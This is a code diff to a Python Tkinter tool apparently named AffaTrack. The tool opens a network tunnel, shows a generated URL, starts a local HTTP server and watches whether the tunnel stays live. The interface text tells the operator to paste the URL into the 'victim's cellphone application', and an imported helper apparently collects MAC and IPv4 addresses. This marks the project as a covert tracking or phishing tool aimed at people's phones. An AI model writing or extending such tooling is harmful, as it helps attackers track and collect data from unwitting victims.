@@ -6,14 +6,22 @@ import tokenMan
 from tokenMan import collec_mac_ipv4
 import threading
 import server
+import requests
+import time
+from server import HTTPServerWrapper
 
-
+openTunnel = True
 defaultTunnelSettingsFlag = True
+defaultServerSettingsFlag = True
 
 defaultTunnelSettings = {
     'host' : "0.0.0.0",
-    'port' : 5555,
+    'port' : 1945,
     'protocol' : "http"
+}
+defaultServerSettings = {
+    'host' : '0.0.0.0',
+    'port' : 1945
 }
 
 
@@ -169,6 +177,8 @@ class tunnel_creator_interface():
             )
             startServerButton.destroy()
 
+            
+
 
         def generate_url(host,port,protocol):
 
@@ -179,15 +189,16 @@ class tunnel_creator_interface():
             progress_bar.stop()
             progress_bar.destroy()
             generating_url_message.config(text="Copy and paste this URL into your victim's cellphone application.")
-            show_generated_url = Label(tunnelWind, text=url, fg="white",bg="black", font=15)
+            show_generated_url = Text(tunnelWind, height=10, width=50)
             show_generated_url.pack(pady=20)
+            show_generated_url.insert(tk.END, url)
 
             startServerButton = Button(tunnelWind, 
                 text="Start Server", 
                 width=20,
                 bg="#999595", 
                 fg="black",
-                command= start_server_interface
+                command=lambda: start_server_interface(url)
             )
             startServerButton.pack(pady=15)
 
@@ -198,13 +209,15 @@ class tunnel_creator_interface():
                 fg="black",
                 command= lambda: stopTunnelUrl(new_url,http_tunel,show_generated_url, stopTunnelButton, startServerButton)
             )
+            hilo = threading.current_thread()
+            print(hilo)
             stopTunnelButton.pack(pady=15)
 
 
 
-        def start_server_interface():
+        def start_server_interface(url):
 
-            newServerWind = server_listening_interface()
+            newServerWind = server_listening_interface(url)
             newServerWind.run_server_interface()
 
 
@@ -255,28 +268,75 @@ class tunnel_creator_interface():
         tunnelWind.mainloop()
 
 class server_listening_interface():
+    def __init__(self, url):
+        self.url = url
+
     def run_server_interface(self):
 
-        serverWind = tk.Tk() 
-
-        serverWind.title("AffaTrack HTTP server listening..")
-        serverWind.geometry("800x500")
-        serverWind.configure(bg="black")
-        title = tk.Label(serverWind, 
-            text="AffaTrack",
-            bg="black", 
-            fg="red", 
-            font=("Helvetica",40,"bold"), 
-            anchor="center"
-            ).pack(side="top", fill="both", anchor="n",pady=10)
+        def start_http_server(host, port):
+            server = HTTPServerWrapper(host, port)
+            server.run()
 
 
 
+        def verify_active_url(url):
+            try:
+                response = requests.get(url)
+                print(f"Verificando URL: {url}, Código de estado: {response.status_code}")
+                if response.status_code == 200:
+                    return True
+            except requests.ConnectionError as e:
+                print("Conexión rechazada:", e)
+            return False
+
+
+        def close_window_case_url_false(root, url, message1):
+            while True:
+                if not verify_active_url(url):
+                    message1.config(text='The tunnel has been closed.')
+                    root.destroy()
+                    break
+
+
+        if defaultServerSettingsFlag:
+            server_maager_thread = threading.Thread(target=lambda: start_http_server(defaultServerSettings['host'],defaultServerSettings['port']))
+            server_maager_thread.start()
+
+            if verify_active_url(self.url):
+                print("hola")
+                serverWind = tk.Tk()
+                serverWind.title("AffaTrack HTTP server listening..")
+                serverWind.geometry("800x500")
+                serverWind.configure(bg="black")
+
+                title = tk.Label(serverWind, 
+                    text="AffaTrack",
+                    bg="black", 
+                    fg="red", 
+                    font=("Helvetica", 40, "bold"), 
+                    anchor="center"
+                )
+                title.pack(side="top", fill="both", anchor="n", pady=10)
+                message1 = Label(serverWind,
+                    text="Server listening on {}, port: {} ...".format(defaultServerSettings['host'],defaultServerSettings['port']),
+                    bg = "black",
+                    fg = "white",
+                    font=15,
+                    anchor="center"
+                )  
+                message1.pack(pady=20)
+
+            
+
+                ngrok_monitor_thread = threading.Thread(target=close_window_case_url_false, args=(serverWind, self.url, message1))
+                ngrok_monitor_thread.daemon = True
+                ngrok_monitor_thread.start()
 
 
 
+                serverWind.mainloop()
+            
 
-        serverWind.mainloop()
 
 
 window = mainInterface()
